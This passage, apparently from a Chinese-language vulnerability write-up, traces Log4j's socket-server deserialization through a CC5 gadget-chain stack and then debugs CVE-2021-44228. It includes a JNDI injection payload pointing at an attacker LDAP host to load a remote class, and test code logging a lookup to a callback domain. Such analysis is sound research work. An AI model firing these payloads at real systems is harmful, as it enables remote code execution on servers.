</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>run</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>EntryMessage</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TcpSocketServer</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>traceEntry</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>boolean</span><span class=w> </span><span class=n>closed</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>while</span><span class=p>(</span><span class=o>!</span><span class=k>this</span><span class=p>.</span><span class=na>shutdown</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>TcpSocketServer</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>logEventInput</span><span class=p>.</span><span class=na>logEvents</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>inputStream</span><span class=p>,</span><span class=w> </span><span class=n>TcpSocketServer</span><span class=p>.</span><span class=na>this</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>EOFException</span><span class=w> </span><span class=n>var9</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>closed</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>OptionalDataException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>TcpSocketServer</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>error</span><span class=p>(</span><span class=s>&#34;OptionalDataException eof=&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>eof</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34; length=&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>length</span><span class=p>,</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>TcpSocketServer</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>error</span><span class=p>(</span><span class=s>&#34;IOException encountered while reading from socket&#34;</span><span class=p>,</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>closed</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>Closer</span><span class=p>.</span><span class=na>closeSilently</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>inputStream</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>finally</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>TcpSocketServer</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>handlers</span><span class=p>.</span><span class=na>remove</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>getId</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>TcpSocketServer</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>traceExit</span><span class=p>(</span><span class=n>entry</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>也就到了<code>TcpSocketServer.this.logEventInput.logEvents</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>logEvents</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>inputStream</span><span class=p>,</span><span class=w> </span><span class=n>LogEventListener</span><span class=w> </span><span class=n>logEventListener</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>logEventListener</span><span class=p>.</span><span class=na>log</span><span class=p>((</span><span class=n>LogEvent</span><span class=p>)</span><span class=n>inputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>IOException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>这里有<code>readObject()</code>方法进行反序列化，也就是整条gadget了</p><p>CC5利用链调用栈如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections</span><span class=p>.</span><span class=na>map</span><span class=p>.</span><span class=na>LazyMap</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>LazyMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>157</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections</span><span class=p>.</span><span class=na>keyvalue</span><span class=p>.</span><span class=na>TiedMapEntry</span><span class=p>.</span><span class=na>getValue</span><span class=p>(</span><span class=n>TiedMapEntry</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>74</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections</span><span class=p>.</span><span class=na>keyvalue</span><span class=p>.</span><span class=na>TiedMapEntry</span><span class=p>.</span><span class=na>toString</span><span class=p>(</span><span class=n>TiedMapEntry</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>132</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>management</span><span class=p>.</span><span class=na>BadAttributeValueExpException</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>BadAttributeValueExpException</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>86</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke0</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>62</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>43</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>Method</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>Method</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>498</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectStreamClass</span><span class=p>.</span><span class=na>invokeReadObject</span><span class=p>(</span><span class=n>ObjectStreamClass</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1170</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readSerialData</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2178</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readOrdinaryObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2069</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readObject0</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1573</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>431</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>net</span><span class=p>.</span><span class=na>server</span><span class=p>.</span><span class=na>ObjectInputStreamLogEventBridge</span><span class=p>.</span><span class=na>logEvents</span><span class=p>(</span><span class=n>ObjectInputStreamLogEventBridge</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>35</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>net</span><span class=p>.</span><span class=na>server</span><span class=p>.</span><span class=na>ObjectInputStreamLogEventBridge</span><span class=p>.</span><span class=na>logEvents</span><span class=p>(</span><span class=n>ObjectInputStreamLogEventBridge</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>29</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>net</span><span class=p>.</span><span class=na>server</span><span class=p>.</span><span class=na>TcpSocketServer$SocketHandler</span><span class=p>.</span><span class=na>run</span><span class=p>(</span><span class=n>TcpSocketServer</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>85</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=cve-2021-44228-1>CVE-2021-44228</h3><p>Apache Log4j 2 的 2.0 到 2.14.1</p><p>Log4j2框架的 Lookup 查询服务提供了动态解析<code>**${}**</code>表达式的能力，但未对解析内容进行严格限制，导致攻击者可通过构造恶意JNDI注入 payload（如<code>**${jndi:ldap://恶意IP/Exploit.class}**</code>）实现远程代码执行。当系统记录含该payload的日志时，Log4j2 会主动请求攻击者控制的 LDAP 服务，下载并执行恶意<code>.class</code>文件，最终造成服务器被完全控制（如反弹shell）。该漏洞(CVE-2021-44228)本质是Lookup 功能与 JNDI 服务的危险组合，使得日志记录这一基础功能成为攻击入口。</p><p>如果在相应协议里面都没有找到资源，就会到http服务去寻找。其次是需要注意jdk版本，我使用的是 8u20，JDK还没开启JNDI的防护。pom.xml 不需要修改，满足版本。</p><p>环境搭建，漏洞代码如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.logging.log4j.LogManager</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.logging.log4j.Logger</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Log4jTEst</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Logger</span><span class=w> </span><span class=n>logger</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>LogManager</span><span class=p>.</span><span class=na>getLogger</span><span class=p>(</span><span class=n>Log4jTEst</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>logger</span><span class=p>.</span><span class=na>error</span><span class=p>(</span><span class=s>&#34;${jndi:ldap://4b0d5qbh.requestrepo.com}&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>然后开始调试，没错，慢慢跟进</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>pattern</span><span class=p>.</span><span class=na>MessagePatternConverter</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=n>MessagePatternConverter</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>111</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>pattern</span><span class=p>.</span><span class=na>PatternFormatter</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=n>PatternFormatter</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>38</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>layout</span><span class=p>.</span><span class=na>PatternLayout$PatternSerializer</span><span class=p>.</span><span class=na>toSerializable</span><span class=p>(</span><span class=n>PatternLayout</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>333</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>layout</span><span class=p>.</span><span class=na>PatternLayout</span><span class=p>.</span><span class=na>toText</span><span class=p>(</span><span class=n>PatternLayout</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>232</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>layout</span><span class=p>.</span><span class=na>PatternLayout</span><span class=p>.</span><span class=na>encode</span><span class=p>(</span><span class=n>PatternLayout</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>217</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>layout</span><span class=p>.</span><span class=na>PatternLayout</span><span class=p>.</span><span class=na>encode</span><span class=p>(</span><span class=n>PatternLayout</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>57</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>appender</span><span class=p>.</span><span class=na>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>directEncodeEvent</span><span class=p>(</span><span class=n>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>177</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>appender</span><span class=p>.</span><span class=na>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>tryAppend</span><span class=p>(</span><span class=n>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>170</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>appender</span><span class=p>.</span><span class=na>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>161</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>AppenderControl</span><span class=p>.</span><span class=na>tryCallAppender</span><span class=p>(</span><span class=n>AppenderControl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>156</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>AppenderControl</span><span class=p>.</span><span class=na>callAppender0</span><span class=p>(</span><span class=n>AppenderControl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>129</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>AppenderControl</span><span class=p>.</span><span class=na>callAppenderPreventRecursion</span><span class=p>(</span><span class=n>AppenderControl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>120</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>AppenderControl</span><span class=p>.</span><span class=na>callAppender</span><span class=p>(</span><span class=n>AppenderControl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>84</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>LoggerConfig</span><span class=p>.</span><span class=na>callAppenders</span><span class=p>(</span><span class=n>LoggerConfig</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>448</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>LoggerConfig</span><span class=p>.</span><span class=na>processLogEvent</span><span class=p>(</span><span class=n>LoggerConfig</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>433</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>LoggerConfig</span><span class=p>.</span><span class=na>log</span><span class=p>(</span><span class=n>LoggerConfig</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>417</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>LoggerConfig</span><span class=p>.</span><span class=na>log</span><span class=p>(</span><span class=n>LoggerConfig</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>403</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>AwaitCompletionReliabilityStrategy</span><span class=p>.</span><span class=na>log</span><span class=p>(</span><span class=n>AwaitCompletionReliabilityStrategy</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>63</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>Logger</span><span class=p>.</span><span class=na>logMessage</span><span class=p>(</span><span class=n>Logger</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>146</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>AbstractLogger</span><span class=p>.</span><span class=na>logMessageSafely</span><span class=p>(</span><span class=n>AbstractLogger</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2091</span><span class=p>)</span><span class=w>
